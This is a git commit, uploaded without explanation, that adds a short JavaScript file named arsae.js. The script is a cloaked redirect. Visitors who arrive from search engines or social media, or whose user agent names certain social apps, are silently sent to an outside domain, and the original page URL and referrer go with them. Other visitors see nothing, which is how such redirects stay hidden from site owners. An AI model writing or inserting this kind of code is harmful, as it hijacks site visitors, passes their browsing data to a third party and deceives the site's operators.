11eb9687a693cced7dbd60fff80a17a074c0cd9e
ajapadam <89146191+ajapadam@users.noreply.github.com>
2021-10-06 04:36:18 +0700

    Add files via upload

---
+++ arsae.js
@@ -0,0 +1,3 @@
+var ars = 'https://fatinsl.info/?arsae=';
+
+if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', '.yahoo.', 'aol.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
